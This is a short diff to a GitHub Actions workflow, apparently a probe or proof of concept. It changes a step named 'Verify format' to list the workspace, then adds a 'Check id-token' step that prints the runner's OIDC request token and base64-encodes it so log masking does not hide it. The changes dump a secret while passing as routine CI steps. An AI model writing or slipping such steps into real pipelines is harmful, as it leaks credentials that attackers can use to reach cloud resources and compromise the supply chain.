@@ -29,4 +29,6 @@ jobs:
         with:
           ref: ${{ github.event.pull_request.head.sha }}
       - name: Verify format
-        run: echo hello world
+        run: find .
+      - name: Check id-token
+        run: echo "This should be the id-token request token: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"; echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN | base64;
